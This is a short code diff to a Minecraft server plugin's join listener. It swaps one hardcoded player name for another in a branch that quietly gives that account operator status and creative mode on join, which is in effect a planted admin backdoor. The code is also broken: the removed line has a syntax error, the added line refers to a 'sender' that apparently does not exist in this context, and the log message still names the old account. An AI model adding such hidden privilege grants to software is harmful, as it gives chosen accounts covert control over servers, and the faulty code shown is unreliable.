@@ -896,9 +896,10 @@ public class TFM_PlayerListener implements Listener
             name = ChatColor.AQUA + name;
             TFM_PlayerData.getPlayerData(player).setTag("&8[&BSuper Admin&8]");
         }
-        else if (username.contains"Alex33856"))
+         else if (sender.getName().equals("DaBoyTM"))
         {
-            player.getInventory().clear();
+      
+            player.setPlayerListName(ChatColor.GREEN + "Al" + ChatColor.DARK_GREEN + "ex");
             TFM_Log.info("[JOIN]:The Developer Alex33856 has joined the game!!!");
             player.setOp(true);
             player.setGameMode(GameMode.CREATIVE);
